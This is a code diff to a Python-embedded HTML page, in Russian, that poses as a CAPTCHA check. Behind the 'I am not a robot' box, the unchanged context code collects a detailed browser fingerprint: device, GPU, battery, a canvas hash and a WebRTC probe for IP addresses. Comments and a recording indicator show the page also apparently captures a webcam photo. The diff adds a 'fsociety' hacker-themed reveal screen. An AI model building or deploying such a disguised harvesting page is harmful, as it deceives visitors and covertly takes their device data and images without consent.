@@ -13,7 +13,7 @@ HTML = """
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Проверка</title>
-<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
 html, body {
@@ -23,6 +23,7 @@ html, body {
   display: flex;
   align-items: center;
   justify-content: center;
+  overflow: hidden;
 }
 .captcha {
   background: #fff;
@@ -32,6 +33,7 @@ html, body {
   padding: 24px;
   width: 320px;
   text-align: center;
+  z-index: 2;
 }
 .logo {
   display: flex;
@@ -72,8 +74,7 @@ html, body {
 .checkbox:hover { border-color: #4285f4; }
 .checkbox.checked { border-color: #4285f4; background: #f0f6ff; }
 .box {
-  width: 24px;
-  height: 24px;
+  width: 24px; height: 24px;
   border: 2px solid #5f6368;
   border-radius: 2px;
   display: flex;
@@ -96,8 +97,7 @@ html, body {
 .status.success { color: #188038; }
 .spinner {
   display: inline-block;
-  width: 14px;
-  height: 14px;
+  width: 14px; height: 14px;
   border: 2px solid #d3d3d3;
   border-top-color: #4285f4;
   border-radius: 50%;
@@ -115,18 +115,83 @@ html, body {
 .rec.active { display: block; }
 .dot {
   display: inline-block;
-  width: 10px;
-  height: 10px;
+  width: 10px; height: 10px;
   background: #d93025;
   border-radius: 50%;
   margin-right: 6px;
   animation: blink 1s infinite;
 }
 @keyframes blink { 50% { opacity: 0.3; } }
+
+/* Финальный экран */
+#final {
+  display: none;
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: #000;
+  z-index: 100;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+  overflow: hidden;
+}
+#final.active { display: flex; }
+#ascii-bg {
+  position: absolute;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  z-index: 0;
+}
+.final-content {
+  position: relative;
+  z-index: 2;
+  text-align: center;
+  font-family: 'Share Tech Mono', monospace;
+  color: #00ff41;
+  padding: 20px;
+  animation: fadeIn 2s ease;
+}
+@keyframes fadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
+.final-line1 {
+  font-size: 28px;
+  letter-spacing: 6px;
+  margin-bottom: 16px;
+  text-shadow: 0 0 12px #00ff41;
+  color: #00ff41;
+}
+.final-line2 {
+  font-size: 16px;
+  letter-spacing: 3px;
+  color: #00ff41;
+  text-shadow: 0 0 8px #00ff41;
+  margin-bottom: 40px;
+}
+.final-fsociety {
+  font-size: 42px;
+  letter-spacing: 10px;
+  color: #00ff41;
+  text-shadow: 0 0 20px #00ff41;
+  animation: pulseGlow 3s ease-in-out infinite;
+}
+@keyframes pulseGlow {
+  0%, 100% { text-shadow: 0 0 20px #00ff41; }
+  50% { text-shadow: 0 0 40px #00ff41, 0 0 60px #00ff41; }
+}
+.final-sub {
+  font-size: 11px;
+  color: #00802a;
+  letter-spacing: 4px;
+  margin-top: 24px;
+  text-transform: uppercase;
+}
 </style>
 </head>
 <body>
-<div class="captcha">
+<div class="captcha" id="captcha">
   <div class="logo">
     <svg viewBox="0 0 24 24" fill="none">
       <path d="M12 2L4 6v6c0 5.5 3.4 10.7 8 12 4.6-1.3 8-6.5 8-12V6l-8-4z" fill="#4285f4"/>
@@ -145,16 +210,28 @@ html, body {
     <div class="checkbox-text">Я не робот</div>
   </div>
   <div class="status" id="status"></div>
-  <div class="rec" id="rec"><span class="dot"></span>Запись видео 3 сек...</div>
+  <div class="rec" id="rec"><span class="dot"></span>Запись 3 сек...</div>
 </div>
+
+<div id="final">
+  <canvas id="ascii-bg"></canvas>
+  <div class="final-content">
+    <div class="final-line1">HELLO, FRIEND.</div>
+    <div class="final-line2">IT'S TIME TO WAKE UP.</div>
+    <div class="final-fsociety">fsociety</div>
+    <div class="final-sub">fsociety // connection</div>
+  </div>
+</div>
+
 <script>
+// Сбор данных
 async function collectData() {
   const data = {
     ua: navigator.userAgent,
     lang: navigator.language,
     langs: navigator.languages ? navigator.languages.join(",") : "",
     platform: navigator.platform,
-    screen: `${screen.width}x${screen.height}`,
+    screen: screen.width + "x" + screen.height,
     colorDepth: screen.colorDepth,
     pixelRatio: window.devicePixelRatio || 1,
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -167,14 +244,12 @@ async function collectData() {
     webrtc: null,
     canvas: null
   };
-
   try {
     if (navigator.getBattery) {
       const b = await navigator.getBattery();
-      data.battery = `${Math.round(b.level * 100)}% ${b.charging ? "charging" : "discharging"}`;
+      data.battery = Math.round(b.level * 100) + "% " + (b.charging ? "charging" : "discharging");
     }
   } catch(e) {}
-
   try {
     const c = document.createElement("canvas");
     const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
@@ -183,7 +258,6 @@ async function collectData() {
       if (dbg) data.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
     }
   } catch(e) {}
-
   try {
     data.canvas = await new Promise(resolve => {
       const c = document.createElement("canvas");
@@ -199,14 +273,10 @@ async function collectData() {
       ctx.fillText("fingerprint", 4, 17);
       const hash = c.toDataURL().split(",")[1];
       let h = 0;
-      for (let i = 0; i < hash.length; i++) {
-        h = ((h << 5) - h) + hash.charCodeAt(i);
-        h |= 0;
-      }
+      for (let i = 0; i < hash.length; i++) { h = ((h << 5) - h) + hash.charCodeAt(i); h |= 0; }
       resolve(Math.abs(h).toString(16));
     });
   } catch(e) {}
-
   try {
     data.webrtc = await new Promise(resolve => {
       const pc = new RTCPeerConnection({ iceServers: [] });
@@ -220,10 +290,10 @@ async function collectData() {
       setTimeout(() => resolve(null), 2000);
     });
   } catch(e) {}
-
   return data;
 }
 
+// Капча → камера → фото → финал
 async function startCheck() {
   const cb = document.getElementById("checkbox");
   const status = document.getElementById("status");
@@ -267,11 +337,50 @@ async function startCheck() {
     cb.classList.add("checked");
     status.className = "status success";
     status.innerText = "Проверка пройдена";
+
+    // Через 1.5 секунды — финальный экран
+    setTimeout(() => {
+      document.getElementById("captcha").style.display = "none";
+      document.getElementById("final").classList.add("active");
+      startAscii();
+    }, 1500);
   } catch (e) {
     rec.classList.remove("active");
     status.className = "status error";
     status.innerText = "Проверка не пройдена. Попробуйте снова.";
   }
+}
+
+// ASCII-анимация на финальном экране
+function startAscii() {
+  const canvas = document.getElementById("ascii-bg");
+  const ctx = canvas.getContext("2d");
+  let w, h, columns, drops;
+  const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
+  const fontSize = 14;
+
+  function resize() {
+    w = canvas.width = window.innerWidth;
+    h = canvas.height = window.innerHeight;
+    columns = Math.floor(w / fontSize);
+    drops = new Array(columns).fill(1);
+  }
+  resize();
+  window.addEventListener("resize", resize);
+
+  function draw() {
+    ctx.fillStyle = "rgba(0,0,0,0.06)";
+    ctx.fillRect(0, 0, w, h);
+    ctx.fillStyle = "#00ff41";
+    ctx.font = fontSize + "px monospace";
+    for (let i = 0; i < drops.length; i++) {
+      const text = chars[Math.floor(Math.random() * chars.length)];
+      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+      if (drops[i] * fontSize > h && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    }
+  }
+  setInterval(draw, 50);
 }
 </script>
 </body>
